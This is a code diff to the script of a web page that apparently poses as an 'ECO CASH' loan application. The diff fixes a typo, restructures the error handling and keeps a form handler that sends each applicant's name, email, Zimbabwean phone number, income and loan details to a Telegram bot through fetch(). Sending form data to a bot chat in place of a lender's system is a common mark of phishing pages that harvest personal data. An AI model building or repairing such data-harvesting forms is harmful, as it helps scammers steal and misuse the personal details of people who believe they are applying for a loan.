@@ -567,7 +567,7 @@
             document.getElementById('step2').classList.add('active');
         });
 
-        // Form Submission to Telegram
+        // Form Submission to Telegram with Guaranteed Error Reset
         document.getElementById('loanForm').addEventListener('submit', async function(e) {
             e.preventDefault();
 
@@ -578,29 +578,29 @@
             submitBtn.textContent = 'SUBMITTING...';
             statusBox.style.display = 'none';
 
-            const firstName = dococument.getElementById('firstName').value;
-            const lastName = document.getElementById('lastName').value;
-            const email = document.getElementById('email').value || 'N/A';
-            const phone = '+263 ' + document.getElementById('phoneNumber').value;
-            const loanAmount = amountDisplay.textContent;
-            const loanTerm = termDisplay.textContent;
-            const purpose = document.getElementById('loanPurpose').value;
-            const employment = document.getElementById('employmentStatus').value;
-            const annualIncome = document.getElementById('annualIncome').value;
+                 try {
+                const firstName = document.getElementById('firstName').value;
+                const lastName = document.getElementById('lastName').value;
+                const email = document.getElementById('email').value || 'N/A';
+                const phone = '+263 ' + document.getElementById('phoneNumber').value;
+                const loanAmount = amountDisplay.textContent;
+                const loanTerm = termDisplay.textContent;
+                const purpose = document.getElementById('loanPurpose').value;
+                const employment = document.getElementById('employmentStatus').value;
+                const annualIncome = document.getElementById('annualIncome').value;
 
-            const message = `🚨 *NEW ECO CASH LOAN APPLICATION* 🚨\n\n` +
-                            `👤 *Name:* ${firstName} ${lastName}\n` +
-                            `📧 *Email:* ${email}\n` +
-                            `📱 *Phone:* ${phone}\n` +
-                            `💰 *Amount:* ${loanAmount}\n` +
-                            `⏱ *Term:* ${loanTerm}\n` +
-                            `📋 *Purpose:* ${purpose}\n` +
-                            `💼 *Employment:* ${employment}\n` +
-                            `💵 *Annual Income:* $${annualIncome}`;
+                const message = `🚨 *NEW ECO CASH LOAN APPLICATION* 🚨\n\n` +
+                                `👤 *Name:* ${firstName} ${lastName}\n` +
+                                `📧 *Email:* ${email}\n` +
+                                `📱 *Phone:* ${phone}\n` +
+                                `💰 *Amount:* ${loanAmount}\n` +
+                                `⏱ *Term:* ${loanTerm}\n` +
+                                `📋 *Purpose:* ${purpose}\n` +
+                                `💼 *Employment:* ${employment}\n` +
+                                `💵 *Annual Income:* $${annualIncome}`;
 
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            try {
                 const response = await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -624,7 +624,8 @@
                     throw new Error(data.description || 'Telegram API error');
                 }
             } catch (error) {
-                statusBox.textContent = 'Submission failed. Please check your network connection.';
+                console.error(error);
+                statusBox.textContent = 'Submission failed: ' + error.message;
                 statusBox.className = 'status-msg';
                 statusBox.style.background = '#fee2e2';
                 statusBox.style.color = '#991b1b';
